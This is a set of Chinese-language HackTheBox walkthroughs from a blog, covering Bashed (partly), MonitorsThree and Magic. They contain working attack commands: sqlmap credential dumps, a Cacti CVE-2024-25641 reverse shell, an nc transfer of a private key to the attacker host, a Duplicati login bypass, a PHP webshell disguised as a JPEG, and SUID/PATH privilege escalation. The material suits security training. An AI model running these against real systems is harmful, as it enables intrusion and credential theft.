先以scriptmanager打开一个新shell，并打开看看有什么：\ndrwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun 2 2022 scripts www-data@bashed:/$ sudo -u scriptmanager /bin/bash sudo -u scriptmanager /bin/bash scriptmanager@bashed:/scripts$ ls -l ls -l total 12 -rw-r\u0026ndash;r\u0026ndash; 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py -rw-r\u0026ndash;r\u0026ndash; 1 root root 12 Apr 19 00:17 test.txt scriptmanager@bashed:/scripts$ cat test.py cat test.py f = open(\u0026ldquo;test.txt\u0026rdquo;, \u0026ldquo;w\u0026rdquo;) f.write(\u0026ldquo;testing 123!\u0026rdquo;) f.close 一个测试用的python文件，猜测可能会被自动运行？上传pspy并观察：\n发现root用户会每隔一段时间运行/scripts文件夹下所有的python文件，那么提权就很简单了。在scripts/ 下创建一个设置bash suid的python文件：\necho \u0026#039;import os; os.system(\"chmod u+s /bin/bash\")\u0026#039; \u0026gt; exploit.py 等待root运行：\n在设置suid后使用/bin/bash -p提权，并在root路径下获取flag：\nHappy hacking\n","date":"2025-04-19T07:25:07Z","image":"https://jojobei.github.io/legacy/uploads/2025/04/1745047500-bashed-150x150.webp","permalink":"https://jojobei.github.io/htb-bashed-Writeup/","title":"HTB-Bashed-Writeup"},{"content":" Medium难度，好像这个机器还有两个前身，一个Monitored，一个Monitored2. 这次图片上变成3了。\n#NMAP 先扫端口:\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; \\n protocol 2.0) | ssh-hostkey: | 256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNwl884vMmev5jgPEogyyLoyjEHsq+F9DzOCgtCA4P8TH2TQcymOgliq7Yzf7x1tL+i2mJedm2BGMKOv1NXXfN0= | 256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519) |ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN5W5QMRdl0vUKFiq9AiP+TVxKIgpRQNyo25qNs248Pa 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) |_http-server-header:nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://monitorsthree.htb/ | http-methods: | Supported Methods: GET HEAD POST OPTIONS #PORT 80 把monitorsthree.htb先加到host里然后访问：\n一个提供网络服务的网站。\nhttp://monitorsthree.htb/login.php 登录界面，尝试弱口令爆破失败。\nhttp://monitorsthree.htb/forgot_password.php 还有一个忘记密码页面，用来重设密码。\n尝试修改admin密码：\n尝试其他的用户名：\n说明admin用户存在。用gobuster遍历目录：\n用filename wordlist遍历各个目录找到了http://monitorsthree.htb/admin/navbar.php可以不用验证直接访问。但除此之外没有找到有用的东西。\n#cacti.monitors.htb 用ffuf遍历可能的subdomain：\n发现子域名：cacti，加入hosts文件并访问。\nCacti 是一个开源的网络监控和图形绘制工具，它主要用于收集和显示来自各种设备（如路由器、交换机、服务器等）的网络数据，并将这些数据以图形化的方式呈现出来。Cacti 是基于 PHP 开发的网页应用，通常运行在 LAMP（Linux, Apache, MySQL, PHP）环境中。 尝试默认密码admin/admin失败。搜索对应版本的vulns，找到了CVE-2024-25641。此漏洞利用/lib/import.php中定义的import_packge()方法实现arbitrary files write。在利用这个漏洞前还是需要一个valid credential。gobuster遍历目录：\nOutput: http://cacti.monitorsthree.htb/app (Status: 301) \u0026#91;--\u0026gt; http://cacti.monitorsthree.htb/app/] http://cacti.monitorsthree.htb/cacti (Status: 301) \u0026#91;--\u0026gt; http://cacti.monitorsthree.htb/cacti/] /cacti指向当前登录页面，/app指向先前的网页。\n#SQLi 在http://monitorsthree.htb/forgot_password.php网页尝试SQLi:\n1\u0026rsquo; or \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1\u0026rsquo;-- -\n再尝试\n1\u0026rsquo; or \u0026lsquo;1\u0026rsquo;=\u0026lsquo;2\u0026rsquo;-- -\n可以确定有SQLi漏洞了，用burpsuite保存请求，使用sqlmap看能不能获取到数据库：\nsqlmap -r req --batch --dbs Output: ... \u0026#91;16:28:10] \u0026#91;INFO] checking if the injection point on POST parameter 'username' is a false positive POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? \u0026#91;y/N] N sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests: --- Parameter: username (POST) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=test' AND (SELECT 4162 FROM (SELECT(SLEEP(5)))PcgJ) AND 'Iwlg'='Iwlg --- \u0026#91;16:29:26] \u0026#91;INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu web application technology: Nginx 1.18.0 back-end DBMS: MySQL \u0026gt;= 5.0.12 (MariaDB fork) \u0026#91;16:29:26] \u0026#91;INFO] fetching database names \u0026#91;16:29:26] \u0026#91;INFO] fetching number of databases \u0026#91;16:29:26] \u0026#91;INFO] resumed: 2 \u0026#91;16:29:26] \u0026#91;INFO] resumed: information_schema \u0026#91;16:29:26] \u0026#91;INFO] resumed: monitorsthree_db available databases \u0026#91;2]: \u0026#91;*] information_schema \u0026#91;*] monitorsthree_db ok，成功了，服务器正在运行MySQL服务器。monitorsthree_db看起来不像是默认数据库，尝试得到tables list。\nsqlmap -r req --batch -D monitorsthree_db --tables 跑了半小时也才蹦出来几个表名，实在等不下去了去dm了做出来的老哥。。。老哥说靠猜parameter。。。那好吧，猜一下表中会有user table。\nsqlmap -r req --batch -D monitorsthree_db -T users --threads 10 --technique=T --level=3 --risk=3 --dump -r: 请求文件，此处是从burpsuite里copy下来的请求 --batch：自动接受默认选项 -D：数据库名 -T：table 名 --threads: 线程数 --technique：SQLi的技术，此处为Timebased --level：注入强度 --risk：注入危险级别 --dump：提取数据 果然有user table.\n... \u0026#91;16:40:51] \u0026#91;INFO] retrieved: id \u0026#91;16:41:22] \u0026#91;INFO] retrieved: username \u0026#91;16:43:19] \u0026#91;INFO] retrieved: email \u0026#91;16:44:30] \u0026#91;INFO] retrieved: password ... 提取到了两个重要的column名 username password，实在是太慢了，修改一下cmd\nsqlmap -r req --batch -D monitorsthree_db -T users --threads 10 --technique=T -C username,password --level=3 --risk=3 --dump -C: column名 终于看到了有用的信息\nadmin:green****** 用拿到的信息登录cacti\n#RCE 搜索后在github找到了这个漏洞的Poc，https://github.com/5ma1l/CVE-2024-25641 clone下来。\nexploit需要四个输入\nURL：cacti服务器地址 username：用户名 password：密码 -payload：php数据 在https://www.revshells.com/里生成一个PHP PentestMonkey的reverse shell 并存到本地\n打开本地端口监听, 并尝试攻击\nnc -nlvp 4444 # open another terminal \u0026 run the following: python3 exploit.py -p rev.php http://cacti.monitorsthree.htb/cacti admin greenxxxxxxx Ok, 拿到shell。\n#Post Enumeration 先把shell升级一下变成TTY shell\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")' 跑一些基础的enumeration指令\ncat /etc/passwd | grep home output: syslog:x:107:113::/home/syslog:/usr/sbin/nologin marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash -------------------- ls -lah /etc/cron* output: ls -lah /etc/cron* -rw-r--r-- 1 root root 1.2K Mar 23 2022 /etc/crontab /etc/cron.d: total 36K drwxr-xr-x 2 root root 4.0K Aug 28 02:47 . drwxr-xr-x 118 root root 4.0K Aug 19 13:09 .. -rw-r--r-- 1 root root 102 Mar 23 2022 .placeholder -rw-r--r-- 1 root root 67 May 18 21:47 cacti -rw-r--r-- 1 root root 46 May 20 17:30 cleanup_cacti -rw-r--r-- 1 root root 47 May 21 16:24 cleanup_cron -rw-r--r-- 1 root root 69 Aug 18 10:18 duplicati -rw-r--r-- 1 root root 201 Jan 8 2022 e2scrub_all -rw-r--r-- 1 root root 712 Jan 9 2024 php /etc/cron.daily: total 36K drwxr-xr-x 2 root root 4.0K Aug 19 12:28 . drwxr-xr-x 118 root root 4.0K Aug 19 13:09 .. -rw-r--r-- 1 root root 102 Mar 23 2022 .placeholder -rwxr-xr-x 1 root root 376 Nov 11 2019 apport -rwxr-xr-x 1 root root 1.5K Apr 8 2022 apt-compat -rwxr-xr-x 1 root root 123 Dec 5 2021 dpkg -rwxr-xr-x 1 root root 377 May 25 2022 logrotate -rwxr-xr-x 1 root root 1.3K Mar 17 2022 man-db -rwxr-xr-x 1 root root 652 Dec 7 2020 plocate /etc/cron.hourly: total 12K drwxr-xr-x 2 root root 4.0K Aug 10 2023 . drwxr-xr-x 118 root root 4.0K Aug 19 13:09 .. -rw-r--r-- 1 root root 102 Mar 23 2022 .placeholder /etc/cron.monthly: total 12K drwxr-xr-x 2 root root 4.0K Aug 10 2023 . drwxr-xr-x 118 root root 4.0K Aug 19 13:09 .. -rw-r--r-- 1 root root 102 Mar 23 2022 .placeholder /etc/cron.weekly: total 16K drwxr-xr-x 2 root root 4.0K Aug 10 2023 . drwxr-xr-x 118 root root 4.0K Aug 19 13:09 .. -rw-r--r-- 1 root root 102 Mar 23 2022 .placeholder -rwxr-xr-x 1 root root 1020 Mar 17 2022 man-db ---------------------------- uname -a output: uname -a Linux monitorsthree 5.15.0-118-generic #128-Ubuntu SMP Fri Jul 5 09:28:59 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux ---------------------------- ss -anp tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 1324/nginx: worker tcp 0 0 0.0.0.0:8888 0.0.0.0:* LISTEN 20072/python3 tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:42331 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8200 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:8084 0.0.0.0:* LISTEN 1259/mono ---------------------------- ls -la /home/ output: ls -la /home/ total 12 drwxr-xr-x 3 root root 4096 May 26 16:34 . drwxr-xr-x 18 root root 4096 Aug 19 13:00 .. drwxr-x--- 4 marcus marcus 4096 Aug 16 11:35 marcus ...... 机器还有另一个用户marcus，并没有找到什么有用的信息。看看网页配置文件。\n搜索网页 https://files.cacti.net/docs/html/unix_configure_cacti.html 这里说了cacti配置文件在../include/config.php\n啊哈，找到了database用户密码。用mysql登录：\nmysql -u cactiuser -h localhost -p Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 67197 Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MariaDB \u0026#91;(none)]\u0026gt;show databases; show databases; +--------------------+ | Database | +--------------------+ | cacti | | information_schema | | mysql | +--------------------+ 3 rows in set (0.001 sec) MariaDB \u0026#91;(none)]\u0026gt; use cacti use cacti Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB \u0026#91;cacti]\u0026gt; show tables; show tables; +-------------------------------------+ | Tables_in_cacti | +-------------------------------------+ | aggregate_graph_templates | | aggregate_graph_templates_graph | | aggregate_graph_templates_item | | aggregate_graphs | | aggregate_graphs_graph_item | | aggregate_graphs_items | | automation_devices | | automation_graph_rule_items | | automation_graph_rules | | automation_ips | | automation_match_rule_items | | automation_networks | | automation_processes | | automation_snmp | | automation_snmp_items | | automation_templates | | automation_tree_rule_items | | automation_tree_rules | | cdef | | cdef_items | | color_template_items | | color_templates | | colors | | data_debug | | data_input | | data_input_data | | data_input_fields | | data_local | | data_source_profiles | | data_source_profiles_cf | | data_source_profiles_rra | | data_source_purge_action | | data_source_purge_temp | | data_source_stats_daily | | data_source_stats_hourly | | data_source_stats_hourly_cache | | data_source_stats_hourly_last | | data_source_stats_monthly | | data_source_stats_weekly | | data_source_stats_yearly | | data_template | | data_template_data | | data_template_rrd | | external_links | | graph_local | | graph_template_input | | graph_template_input_defs | | graph_templates | | graph_templates_gprint | | graph_templates_graph | | graph_templates_item | | graph_tree | | graph_tree_items | | host | | host_graph | | host_snmp_cache | | host_snmp_query | | host_template | | host_template_graph | | host_template_snmp_query | | plugin_config | | plugin_db_changes | | plugin_hooks | | plugin_realms | | poller | | poller_command | | poller_data_template_field_mappings | | poller_item | | poller_output | | poller_output_boost | | poller_output_boost_local_data_ids | | poller_output_boost_processes | | poller_output_realtime | | poller_reindex | | poller_resource_cache | | poller_time | | processes | | reports | | reports_items | | rrdcheck | | sessions | | settings | | settings_tree | | settings_user | | settings_user_group | | sites | | snmp_query | | snmp_query_graph | | snmp_query_graph_rrd | | snmp_query_graph_rrd_sv | | snmp_query_graph_sv | | snmpagent_cache | | snmpagent_cache_notifications | | snmpagent_cache_textual_conventions | | snmpagent_managers | | snmpagent_managers_notifications | | snmpagent_mibs | | snmpagent_notifications_log | | user_auth | | user_auth_cache | | user_auth_group | | user_auth_group_members | | user_auth_group_perms | | user_auth_group_realm | | user_auth_perms | | user_auth_realm | | user_auth_row_cache | | user_domains | | user_domains_ldap | | user_log | | vdef | | vdef_items | | version | +-------------------------------------+ 113 rows in set (0.001 sec) MariaDB \u0026#91;cacti]\u0026gt; select * from user_auth; select * from user_auth; +----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+ | id | username | password | realm | full_name | email_address | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms | +----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+ | 1 | admin | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G | 0 | Administrator | marcus@monitorsthree.htb | | | on | on | on | on | 2 | 1 | 1 | 1 | 1 | on | -1 | -1 | -1 | | 0 | 0 | 436423766 | | 3 | guest | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu | 0 | Guest Account | guest@monitorsthree.htb | | | on | on | on | | 1 | 1 | 1 | 1 | 1 | | -1 | -1 | -1 | | 0 | 0 | 3774379591 | | 4 | marcus | $2y$10$Fq8wGXvlM3Le.***************************************************** | 0 | Marcus | marcus@monitorsthree.htb | | on | on | on | on | on | 1 | 1 | 1 | 1 | 1 | on | -1 | -1 | | | 0 | 0 | 1677427318 | +----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+ 3 rows in set (0.000 sec) 找到了marcus的hash，接下来就要交给hashcat了。**$2*$**的prefix一般都是bcrypt, 用hashcat暴力破解：\nhashcat -m 3200 -a 0 ./hash /usr/share/wordlists/rockyou.txt 破解成功，拿到marcus密码。\n#User flag 用得到的credential 以marcus ssh 登录。\nCVE-2024-25641 git:(master): ssh marcus@cacti.monitorsthree.htb marcus@cacti.monitorsthree.htb: Permission denied (publickey). 好吧，把密码认证关了，但我还有个active shell，直接su marcus试试。\n成功。在marcus home目录下找到user flag\n#Enumeration Again.. marcus home目录下有.ssh 文件夹，且里面有id_rsa 私钥。(这个id_rsa可能是别人留下的，好多人打一个机器, 但也可以用ssh-keygen 自己生成一对公私钥). 使用nc下载到本地\nssh登录成功。\nnc 10.10.14.13 4445 \u0026lt; id_rsa #kali nc -nlvp 4445 \u0026gt; id_rsa ssh -i id_rsa marcus@cacti.monitorsthree.htb Last login: Tue Aug 20 11:34:00 2024 marcus@monitorsthree:~$ 在/opt/目录下发现了一些文件, /opt/目录通常是存放第三方软件的地方。\ndrwxr-xr-x 3 root root 4096 May 20 15:53 backups drwx--x--x 4 root root 4096 May 20 14:38 containerd -rw-r--r-- 1 root root 318 May 26 16:08 docker-compose.yml drwxr-xr-x 3 root root 4096 Aug 18 08:00 duplicati 在/opt/duplicati/ 目录下发现了三个数据库文件\ntotal 2832 drwxr-xr-x 2 root root 4096 Aug 18 08:00 control_dir_v2 -rw-r--r-- 1 root root 2461696 Aug 28 02:47 CTADPNHLTC.sqlite -rw------- 1 root root 163840 Aug 28 04:34 DKKEDMSRFK.sqlite -rw-r--r-- 1 root root 94208 Aug 28 04:40 Duplicati-server.sqlite -rw------- 1 root root 167936 Aug 28 04:34 UZOFQVHQXW.sqlite 使用scp下载，并用sqlite打开查看。\n在Duplicati-server.sqlite数据库的option中发现了 server-passphrase。看着像base64加密的，尝试用base64解码\n乱码。。\n也找不到对应的hash类型。先记录下。\n搜了一圈没再发现什么可疑的东西。想起服务器在内网开放了8200端口，用ssh port forward一下看看是什么。\nssh -L 8200:127.0.0.1:8200 marcus@cacti.monitorsthree.htb -i id_rsa -N #Root flag 打开浏览器访问 http://localhost:8200\nDuplicati 是一个开源的、跨平台的备份解决方案，主要用于加密、备份和恢复文件。它通过 Web 界面进行管理和配置，使得用户能够轻松地在各种存储目标之间创建和管理备份任务。Duplicati 支持多种操作系统，包括 Windows、macOS 和 Linux。 搜索duplicati exploit找到了这个文章 https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee\n了解到duplicati的login.js暴露了加密方法：\n使用文中方法，把得到的passphrase进行转换。\n在firfox中打开inspect-\u0026gt;console\nallow pasting var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(\"r4SX7ebpyPo4mlDvMkJOucJTfHQhXftKP2VVShRHlY=\") + \"59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a\")).toString(CryptoJS.enc.Base64); noncedpwd \"UvrZnpXsxYhieUFAF2H+X6hmFRtIcN9hHGTCWaR2smU=\" 并在burpsuite中把拦截到的请求data： password替换成生成的值。\n登录成功。摸索一番后，了解到这个应用可以备份文件，还可以把备份文件还原到指定目录。\n我们可以在本地生成一个ssh key并把公钥传递到靶机上。通过备份把authorized_keys放到root根目录下的.ssh文件里，就可以通过密钥访问root。先在本地生成ssh key，并把authorized_keys传递到靶机\n# kali linux ssh-keygen -t rsa -b 4096 -f monitor scp -i id_rsa monitor.pub marcus@10.10.11.30:/home/marcus/authorized_keys 新建一个备份任务：\n关闭自动备份\n运行后，选择直接从备份还原\n还原到root的.ssh文件下\n显示成功后用密钥连接\n➜ Monitor ssh -i monitor root@cacti.monitorsthree.htb Last login: Tue Aug 20 15:21:21 2024 root@monitorsthree:~# ls root.txt scripts root@monitorsthree:~# id uid=0(root) gid=0(root) groups=0(root) root@monitorsthree:~# BOOM. Rooted.\nHappy Hacking.\n","date":"2025-01-01T08:44:04Z","image":"https://jojobei.github.io/legacy/uploads/2024/08/1724822083-monitor-150x150.webp","permalink":"https://jojobei.github.io/htb-season-6-monitored/","title":"HTB-Season 6-Monitored"},{"content":" Medium难度，直接扫端口。\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ= | 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Magic Portfolio |_http-server-header: Apache/2.4.29 (Ubuntu) Port 80 {.wp-block-heading} 一个图片展示网站。左下角显示可以login可以登录。\nhttp://10.10.10.185/login.php （服务器运行php）\n弱口令失败，magic，root，admin。随机输入错误用户名密码时会显示\n试试SQLi 1\u0026rsquo;or'1\u0026rsquo;=\u0026lsquo;1\u0026rsquo;\u0026ndash; 没有跳出错误用户名与密码，但也没有登录。有点可疑。用户名里不能输入空格，打开burpsuite在里面加入空格并html encode试试\n依然没有跳出“wrong Username or Password”。但等于页面确实会对字符“ ’ ” 有不同的回应。用sqlmap试试。\nsqlmap -r req --batch -dbs --level=3 --risk=3 有sql注入漏洞，且提取到了两个数据库。提取Magic看看有什么。\nsqlmap -r req --batch -dbs --level=3 --risk=3 -D Magic --tables dump数据\nsqlmap -r req --batch -dbs --level=3 --risk=3 -D Magic -T login --dump Database: Magic Table: login \u0026#91;1 entry] +----+----------------+----------+ | id | password | username | +----+----------------+----------+ | 1 | Th3s3usW4sK1ng | admin | +----+----------------+----------+ ok，得到admin密码，试试在页面登录。登录成功：\nhttp://10.10.10.185/upload.php\nRCE 可以上传图片，已知服务器运行的有php，上传个php文件试试。\n上传个test.php.jpg呢？php会识别.php.jpg文件后缀并当成php文件执行\n哈哈，被抓到了。试试把php内容放到jpg里呢？\n机器的名字像是给了个提示，试试改变文件的magic bytes\n通过wikihttps://en.wikipedia.org/wiki/List_of_file_signatures查到jpg的magicbytes是 FF D8 FF E0\n打开hexedit 修改后上传\n成功了！刷新看看\n右键打开新标签查看\n显示jpg错误。一番操作后，发现了服务器会识别文件名后缀和文件的magic bytes，不会匹配content-type。\n突发奇想，会不会是服务器先查看文件后缀是否匹配，然后再查看文件magic bytes呢？如果把后缀.php.jpg和修改magic bytes组合起来呢？\nvim test.php.jpg \u003e \u0026lt;?php echo system($_GET\u0026#91;'cmd']); ?\u003e 然后hexedit修改magic bytes\n上传并打开：\nrce成功。用https://www.revshells.com/ 网站生成一个pentest monkey的 php revshell上传\n打开netcat监听\nmagic nc -nlvp 4444 listening on \u0026#91;any] 4444 ... connect to \u0026#91;10.10.14.13] from (UNKNOWN) \u0026#91;10.10.10.185] 45358 Linux magic 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 21:08:11 up 2:18, 0 users, load average: 0.07, 0.02, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1199): Inappropriate ioctl for device bash: no job control in this shell www-data@magic:/$ 拿到revshell\nLateral Movement 先升级下shell\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")' 看看有什么用户\n有个theseus用户。开放端口：\nActive Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - 内网开放了631和3306\n在/var/www/Magic/目录下\nwww-data@magic:/var/www/Magic$ ls -al ls -al total 52 drwxr-xr-x 4 www-data www-data 4096 Jul 12 2021 . drwxr-xr-x 4 root root 4096 Jul 6 2021 .. -rwx---r-x 1 www-data www-data 162 Oct 18 2019 .htaccess drwxrwxr-x 6 www-data www-data 4096 Jul 6 2021 assets -rw-r--r-- 1 www-data www-data 881 Oct 16 2019 db.php5 drwxr-xr-x 4 www-data www-data 4096 Jul 6 2021 images -rw-rw-r-- 1 www-data www-data 4528 Oct 22 2019 index.php -rw-r--r-- 1 www-data www-data 5539 Oct 22 2019 login.php -rw-r--r-- 1 www-data www-data 72 Oct 18 2019 logout.php -rw-r--r-- 1 www-data www-data 4520 Oct 22 2019 upload.php 查看db.php5 得到数据库cred: theseus/iamkingtheseus 直接su用户看看有没有密码复用\n啧，不行。用前面找到的Magic admin的密码试试\n芜湖~在home/theseus下得到user flag. 查看/etc/ssh/ssh_config配置文件\nssh关闭了密码认证，在kali上创造一对密钥: ssh-keygen -t rsa -b 4096 -f magic\n并把publick key上传到theseus/.ssh/authorized_keys\n服务器没装curl 用wget上传key并登录\nok，ssh登录成功。\nRoot 交给linpeas 做enumeration吧。。找了一大圈，发现没什么可疑的。只能试试kernelexploit了.\n试试Pwnkit https://codeload.github.com/berdav/CVE-2021-4034/zip/main\n上传后运行：\nBoom rooted.\nAlternative way 官方Writeup用的是另一种方法。也是我懒，没有细看每一个SUID的binary。\nlinpeas找到了一个未知的suid binary。运行后输出系统信息。使用strings /bin/sysinfo查看binary里的字符串\n发现系统在用cat /proc/cpuinfo 打印cpu信息而不是/bin/cat 这意味着有PATH injection漏洞。\n在theseus主目录下创建一个文件cat, 并把路径加入PATH\necho \"#/bin/bash\\n chmod +s /bin/bash\" \u003e cat chmod +x cat export PATH=/home/theseus/:$PATH 再次运行/bin/sysinfo后查看/bin/bash权限\nrooted\n","date":"2024-08-29T05:31:35Z","image":"https://jojobei.github.io/legacy/uploads/2024/08/1724907410-73eebbbdfbbfd46258ea2ae7e52d9479-150x150.webp","permalink":"https://jojobei.github.io/htb-retired-magic-Writeup/","title":"HTB-Retired-Magic-Writeup"}]